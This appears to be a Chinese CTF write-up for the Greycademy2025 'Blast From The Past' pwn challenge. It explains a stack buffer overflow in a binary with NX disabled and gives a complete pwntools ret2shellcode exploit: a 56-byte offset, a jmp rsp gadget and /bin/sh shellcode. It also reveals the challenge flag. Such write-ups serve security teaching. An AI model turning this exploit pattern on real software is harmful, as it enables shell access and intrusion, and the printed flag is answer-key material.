# Greycademy2025 Blast From The Past

## 题目简述

程序把最多 320 字节的名字读入 32 字节栈缓冲区。二进制没有栈 Canary、没有 PIE，且 NX 关闭，因此可以覆盖返回地址并跳回栈上执行自带 shellcode。

## 解题过程

漏洞位于：

```c
char retro_cat[32];
scanf("%320s", retro_cat);
```

`checksec` 显示 `No canary`、`NX disabled`、`No PIE`。用 cyclic pattern 或反汇编确认，从缓冲区起始到保存的返回地址相距 56 字节。程序在 `0x4011fc` 处存在 `jmp rsp`，而函数返回后 RSP 正好指向覆盖地址后紧接的字节，于是 payload 布局是：

```text
56 字节填充 | 0x4011fc (jmp rsp) | amd64 /bin/sh shellcode
```

本地验证脚本：

```python
from pwn import *

context.binary = elf = ELF("./challenge")
context.arch = "amd64"

p = process("./challenge")
payload = b"A" * 56
payload += p64(0x4011fc)
payload += asm(shellcraft.sh())

p.sendlineafter(b"dude:", payload)
p.sendline(b"cat flag.txt; exit")
print(p.recvall().decode())
```

在仓库的 service 目录运行后取得：

```text
grey{traditional_ret2shellcode_exploits!}
```

## 方法总结

决定利用方式的不是“存在栈溢出”这一点，而是保护组合。NX 关闭允许直接执行栈数据，固定地址又能稳定使用 `jmp rsp`，因此无需构造 ret2libc。偏移 56 包含编译器为局部变量和栈对齐保留的空间，不能只按源码中的 32 字节数组大小猜测。
